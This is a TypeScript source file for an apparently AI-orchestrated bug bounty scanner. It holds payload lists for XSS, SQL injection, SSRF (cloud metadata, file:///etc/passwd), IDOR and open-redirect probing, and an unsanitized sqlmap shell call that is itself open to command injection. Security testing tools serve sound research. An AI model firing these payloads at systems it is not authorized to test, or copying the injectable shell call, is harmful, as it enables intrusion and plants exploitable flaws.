/**
 * SolverPool Architecture
 * Dynamic solver spawning per endpoint-per-vuln-class.
 * Single-Brain Architecture: Strategy Coordinator is sole decision-maker
 * with confidence-driven dispatch.
 */
import { EventEmitter } from "events";
import PQueue from "p-queue";
import { v4 as uuidv4 } from "uuid";
import { exec } from "child_process";
import { promisify } from "util";
import axios from "axios";
import logger from "../utils/logger";
import { ModelRouter } from "../intelligence/ModelRouter";
import { db } from "../db";
import { solverResults } from "../db/schema";

const execAsync = promisify(exec);

// ─── Types ────────────────────────────────────────────────────────────────────
export interface SolverTask {
  id: string;
  endpoint: string;
  vulnClass: VulnClass;
  programId: number;
  sessionId: number;
  priority: number;
  confidence: number;
  context: Record<string, unknown>;
}

export type VulnClass =
  | "xss" | "sqli" | "ssrf" | "lfi" | "rfi" | "rce" | "xxe"
  | "idor" | "auth_bypass" | "open_redirect" | "cors" | "csrf"
  | "info_disclosure" | "misconfig" | "exposed_admin" | "subdomain_takeover"
  | "rate_limit_bypass" | "business_logic";

export interface SolverResult {
  taskId: string;
  solverId: string;
  endpoint: string;
  vulnClass: VulnClass;
  found: boolean;
  confidence: number;
  evidence: Record<string, unknown>;
  payload: string;
  request: string;
  response: string;
  duration: number;
  toolsUsed: string[];
}

// ─── Individual Solvers ───────────────────────────────────────────────────────
abstract class BaseSolver {
  protected modelRouter = ModelRouter.getInstance();

  abstract solve(task: SolverTask): Promise<SolverResult>;

  protected async httpProbe(
    url: string,
    method: string = "GET",
    params?: Record<string, string>,
    headers?: Record<string, string>,
    body?: string
  ): Promise<{ status: number; headers: Record<string, string>; body: string }> {
    try {
      const resp = await axios({
        method,
        url,
        params,
        headers: {
          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
          ...headers,
        },
        data: body,
        timeout: 10000,
        validateStatus: () => true,
        maxRedirects: 3,
      });
      return {
        status: resp.status,
        headers: resp.headers as Record<string, string>,
        body: typeof resp.data === "string" ? resp.data.slice(0, 5000) : JSON.stringify(resp.data).slice(0, 5000),
      };
    } catch (err: unknown) {
      const error = err as { message: string };
      return { status: 0, headers: {}, body: error.message };
    }
  }
}

class XSSSolver extends BaseSolver {
  private readonly payloads = [
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "'><svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "{{7*7}}",  // SSTI check
    "${7*7}",
    "<%=7*7%>",
  ];

  async solve(task: SolverTask): Promise<SolverResult> {
    const start = Date.now();
    const results: Array<{ payload: string; reflected: boolean; stored: boolean }> = [];
    let found = false;
    let bestPayload = "";
    let lastReq = "";
    let lastResp = "";

    for (const payload of this.payloads) {
      const encoded = encodeURIComponent(payload);
      const probeUrl = `${task.endpoint}?q=${encoded}&search=${encoded}&s=${encoded}`;
      const resp = await this.httpProbe(probeUrl);
      lastReq = probeUrl;
      lastResp = resp.body;

      const reflected = resp.body.includes(payload) || resp.body.includes(payload.replace(/</g, "&lt;"));
      if (reflected) {
        found = true;
        bestPayload = payload;
        results.push({ payload, reflected: true, stored: false });
        break;
      }
    }

    return {
      taskId: task.id,
      solverId: `xss-solver-${uuidv4().slice(0, 8)}`,
      endpoint: task.endpoint,
      vulnClass: "xss",
      found,
      confidence: found ? 0.85 : 0.1,
      evidence: { results, payloadsTested: this.payloads.length },
      payload: bestPayload,
      request: lastReq,
      response: lastResp.slice(0, 1000),
      duration: Date.now() - start,
      toolsUsed: ["http_probe", "xss_payload_library"],
    };
  }
}

class SQLiSolver extends BaseSolver {
  private readonly probes = [
    { payload: "' OR '1'='1", errorCheck: /sql|syntax|mysql|ora-\d+|sqlite|pg_/i },
    { payload: "1; SELECT SLEEP(2)--", errorCheck: /sql|error/i },
    { payload: "' AND 1=1--", errorCheck: /sql|error/i },
    { payload: "1 UNION SELECT NULL--", errorCheck: /sql|column|union/i },
    { payload: "' OR 1=1#", errorCheck: /sql|error/i },
    { payload: `'; WAITFOR DELAY '0:0:2'--`, errorCheck: /sql|error/i },
  ];

  async solve(task: SolverTask): Promise<SolverResult> {
    const start = Date.now();
    let found = false;
    let bestPayload = "";
    let lastResp = { status: 0, headers: {} as Record<string, string>, body: "" };

    // Try sqlmap first if available
    try {
      const { stdout } = await execAsync(
        `sqlmap -u "${task.endpoint}?id=1" --batch --level=1 --risk=1 --timeout=10 --disable-coloring 2>&1 | tail -20`,
        { timeout: 30000 }
      );
      if (/is vulnerable|parameter .* is vulnerable/i.test(stdout)) {
        found = true;
        bestPayload = "sqlmap detected SQLi";
        return {
          taskId: task.id,
          solverId: `sqli-solver-${uuidv4().slice(0, 8)}`,
          endpoint: task.endpoint,
          vulnClass: "sqli",
          found: true,
          confidence: 0.92,
          evidence: { sqlmapOutput: stdout.slice(0, 1000) },
          payload: bestPayload,
          request: `sqlmap -u "${task.endpoint}?id=1"`,
          response: stdout.slice(0, 500),
          duration: Date.now() - start,
          toolsUsed: ["sqlmap"],
        };
      }
    } catch { /* sqlmap not available or timed out – fall through to manual */ }

    // Manual probing
    for (const probe of this.probes) {
      const probeUrl = `${task.endpoint}?id=${encodeURIComponent(probe.payload)}`;
      const t0 = Date.now();
      const resp = await this.httpProbe(probeUrl);
      const elapsed = Date.now() - t0;
      lastResp = resp;

      // Time-based detection
      if (elapsed > 1800 && probe.payload.includes("SLEEP")) {
        found = true;
        bestPayload = probe.payload;
        break;
      }
      // Error-based detection
      if (probe.errorCheck.test(resp.body)) {
        found = true;
        bestPayload = probe.payload;
        break;
      }
    }

    return {
      taskId: task.id,
      solverId: `sqli-solver-${uuidv4().slice(0, 8)}`,
      endpoint: task.endpoint,
      vulnClass: "sqli",
      found,
      confidence: found ? 0.8 : 0.1,
      evidence: { probesTested: this.probes.length },
      payload: bestPayload,
      request: `${task.endpoint}?id=${encodeURIComponent(bestPayload)}`,
      response: lastResp.body.slice(0, 500),
      duration: Date.now() - start,
      toolsUsed: ["http_probe", "sqli_payload_library"],
    };
  }
}

class SSRFSolver extends BaseSolver {
  private readonly ssrfPayloads = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://localhost:22/",
    "http://127.0.0.1:80/",
    "http://[::1]/",
    "dict://localhost:11211/",
    "gopher://localhost:25/",
    "file:///etc/passwd",
  ];

  async solve(task: SolverTask): Promise<SolverResult> {
    const start = Date.now();
    let found = false;
    let bestPayload = "";
    let bestResp = "";

    for (const payload of this.ssrfPayloads) {
      for (const param of ["url", "redirect", "next", "goto", "target", "dest", "destination", "rurl", "return"]) {
        const probeUrl = `${task.endpoint}?${param}=${encodeURIComponent(payload)}`;
        const resp = await this.httpProbe(probeUrl);

        // AWS metadata detection
        if (resp.body.includes("ami-id") || resp.body.includes("instance-id")) {
          found = true;
          bestPayload = payload;
          bestResp = resp.body;
          break;
        }
        // GCP metadata detection
        if (resp.body.includes("computeMetadata") || resp.body.includes("project-id")) {
          found = true;
          bestPayload = payload;
          bestResp = resp.body;
          break;
        }
        // /etc/passwd detection
        if (resp.body.match(/root:.*:0:0:/)) {
          found = true;
          bestPayload = payload;
          bestResp = resp.body;
          break;
        }
      }
      if (found) break;
    }

    return {
      taskId: task.id,
      solverId: `ssrf-solver-${uuidv4().slice(0, 8)}`,
      endpoint: task.endpoint,
      vulnClass: "ssrf",
      found,
      confidence: found ? 0.9 : 0.05,
      evidence: { payloadsTested: this.ssrfPayloads.length },
      payload: bestPayload,
      request: bestPayload ? `${task.endpoint}?url=${encodeURIComponent(bestPayload)}` : "",
      response: bestResp.slice(0, 500),
      duration: Date.now() - start,
      toolsUsed: ["http_probe", "ssrf_payload_library"],
    };
  }
}

class IDORSolver extends BaseSolver {
  async solve(task: SolverTask): Promise<SolverResult> {
    const start = Date.now();
    const results: Record<string, unknown>[] = [];
    let found = false;
    let evidence = "";

    // Extract numeric IDs from URL
    const idMatches = task.endpoint.match(/\/(\d+)/g) || [];
    if (idMatches.length === 0) {
      return {
        taskId: task.id, solverId: `idor-solver-${uuidv4().slice(0, 8)}`,
        endpoint: task.endpoint, vulnClass: "idor", found: false,
        confidence: 0.05, evidence: { reason: "No numeric IDs found in URL" },
        payload: "", request: "", response: "", duration: Date.now() - start,
        toolsUsed: [],
      };
    }

    // Test sequential ID manipulation
    const originalResp = await this.httpProbe(task.endpoint);
    for (let i = 1; i <= 5; i++) {
      const modifiedUrl = task.endpoint.replace(/\/\d+/, `/${i}`);
      if (modifiedUrl === task.endpoint) continue;
      const resp = await this.httpProbe(modifiedUrl);

      if (resp.status === 200 && resp.body.length > 100) {
        // Check if data belongs to different user
        const suspicious = resp.status === originalResp.status &&
          resp.body.length !== originalResp.body.length &&
          !resp.body.includes("unauthorized") &&
          !resp.body.includes("forbidden");

        if (suspicious) {
          found = true;
          evidence = `ID ${i} returned different user data`;
          results.push({ id: i, status: resp.status, bodyLength: resp.body.length });
        }
      }
    }

    return {
      taskId: task.id,
      solverId: `idor-solver-${uuidv4().slice(0, 8)}`,
      endpoint: task.endpoint,
      vulnClass: "idor",
      found,
      confidence: found ? 0.7 : 0.1,
      evidence: { results, idsFound: idMatches },
      payload: evidence,
      request: task.endpoint,
      response: originalResp.body.slice(0, 300),
      duration: Date.now() - start,
      toolsUsed: ["http_probe", "sequential_id_test"],
    };
  }
}

class OpenRedirectSolver extends BaseSolver {
  private readonly payloads = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "/\\evil.com",
    "https:evil.com",
    "javascript:alert(1)",
  ];

  async solve(task: SolverTask): Promise<SolverResult> {
    const start = Date.now();
    const params = ["redirect", "next", "url", "goto", "return", "returnUrl", "dest", "destination", "r", "to"];
    let found = false;
    let bestPayload = "";
    let bestResp = "";

    for (const payload of this.payloads) {
      for (const param of params) {
        const resp = await this.httpProbe(
          `${task.endpoint}?${param}=${encodeURIComponent(payload)}`,
          "GET", undefined, undefined, undefined
        );

        const locationHeader = resp.headers["location"] || "";
        if (locationHeader.includes("evil.com") || locationHeader.startsWith("//evil")) {
          found = true;
          bestPayload = payload;
          bestResp = JSON.stringify(resp.headers);
          break;
        }
      }
      if (found) break;
    }

    return {
      taskId: task.id,
      solverId: `redirect-solver-${uuidv4().slice(0, 8)}`,
      endpoint: task.endpoint,
      vulnClass: "open_redirect",
      found,
      confidence: found ? 0.88 : 0.05,
      evidence: { payloadsTested: this.payloads.length * params.length },
      payload: bestPayload,
      request: found ? `${task.endpoint}?redirect=${encodeURIComponent(bestPayload)}` : "",
      response: bestResp,
      duration: Date.now() - start,
      toolsUsed: ["http_probe"],
    };
  }
}

// Solver registry
const SOLVER_REGISTRY: Partial<Record<VulnClass, new () => BaseSolver>> = {
  xss: XSSSolver,
  sqli: SQLiSolver,
  ssrf: SSRFSolver,
  idor: IDORSolver,
  open_redirect: OpenRedirectSolver,
};

// ─── Strategy Coordinator (Single Brain) ──────────────────────────────────────
class StrategyCoordinator {
  private modelRouter = ModelRouter.getInstance();

  async dispatch(endpoint: string, observations: Record<string, unknown>): Promise<SolverTask[]> {
    const prompt = `You are a bug bounty strategy coordinator analyzing an endpoint.

Endpoint: ${endpoint}
Observations: ${JSON.stringify(observations, null, 2)}

Determine which vulnerability classes to test. Consider:
- What technologies are present?
- What parameters does the endpoint accept?
- What is the likely attack surface?
- Historical success rates

Return a JSON array of objects with:
- vulnClass: the vulnerability class to test
- priority: 1-10 (10=highest)
- confidence: 0.0-1.0 (likelihood of finding)
- reasoning: why this vuln class applies

Only include vuln classes with confidence > 0.3. Maximum 5 tasks.
Return ONLY the JSON array.`;

    try {
      const response = await this.modelRouter.reason(prompt);
      const tasks = JSON.parse(response.match(/\[[\s\S]+\]/)?.[0] || "[]");
      return tasks.map((t: Record<string, unknown>) => ({
        id: uuidv4(),
        endpoint,
        vulnClass: t.vulnClass as VulnClass,
        programId: 0,
        sessionId: 0,
        priority: Number(t.priority) || 5,
        confidence: Number(t.confidence) || 0.5,
        context: { reasoning: t.reasoning, observations },
      }));
    } catch {
      // Fallback: default high-value targets
      return ["xss", "sqli", "idor", "ssrf", "open_redirect"].map(vc => ({
        id: uuidv4(),
        endpoint,
        vulnClass: vc as VulnClass,
        programId: 0,
        sessionId: 0,
        priority: 5,
        confidence: 0.4,
        context: {},
      }));
    }
  }
}

// ─── SolverPool ───────────────────────────────────────────────────────────────
export class SolverPool extends EventEmitter {
  private queue: PQueue;
  private coordinator = new StrategyCoordinator();
  private activeJobs = new Map<string, SolverTask>();
  private results: SolverResult[] = [];

  constructor(concurrency: number = 5) {
    super();
    this.queue = new PQueue({ concurrency });
  }

  async spawnSolvers(
    endpoint: string,
    observations: Record<string, unknown>,
    options: { programId: number; sessionId: number } = { programId: 0, sessionId: 0 }
  ): Promise<SolverResult[]> {
    logger.info("SolverPool: Spawning solvers", { endpoint });

    // Strategy Coordinator decides what to test
    const tasks = await this.coordinator.dispatch(endpoint, observations);
    tasks.forEach(t => { t.programId = options.programId; t.sessionId = options.sessionId; });

    this.emit("solvers:spawned", { count: tasks.length, endpoint });

    // Enqueue all tasks in parallel
    const promises = tasks.map(task => {
      this.activeJobs.set(task.id, task);
      this.emit("solver:started", { taskId: task.id, vulnClass: task.vulnClass });

      return this.queue.add(async () => {
        const SolverClass = SOLVER_REGISTRY[task.vulnClass];
        if (!SolverClass) {
          logger.warn(`No solver for ${task.vulnClass}, using generic HTTP probe`);
          return null;
        }

        const solver = new SolverClass();
        try {
          const result = await solver.solve(task);
          this.activeJobs.delete(task.id);
          this.emit("solver:complete", { taskId: task.id, found: result.found, confidence: result.confidence });

          // Persist result
          await this.persistResult(result, options.sessionId);
          if (result.found) {
            this.emit("solver:finding", { result });
            this.results.push(result);
          }
          return result;
        } catch (err) {
          logger.error("Solver error", { taskId: task.id, vulnClass: task.vulnClass, err });
          this.activeJobs.delete(task.id);
          return null;
        }
      });
    });

    const allResults = await Promise.all(promises);
    return allResults.filter(Boolean) as SolverResult[];
  }

  private async persistResult(result: SolverResult, sessionId: number): Promise<void> {
    try {
      await db.insert(solverResults).values({
        huntSessionId: sessionId,
        solverId: result.solverId,
        endpoint: result.endpoint,
        vulnClass: result.vulnClass,
        result: result as unknown as Record<string, unknown>,
        confidence: result.confidence,
        duration: result.duration,
        toolsUsed: result.toolsUsed,
        status: result.found ? "found" : "clean",
      });
    } catch (err) {
      logger.error("Failed to persist solver result", { err });
    }
  }

  getActiveJobs(): SolverTask[] {
    return [...this.activeJobs.values()];
  }

  getResults(): SolverResult[] {
    return this.results;
  }

  getStats(): { queued: number; running: number; completed: number } {
    return {
      queued: this.queue.size,
      running: this.queue.pending,
      completed: this.results.length,
    };
  }
}

export default SolverPool;
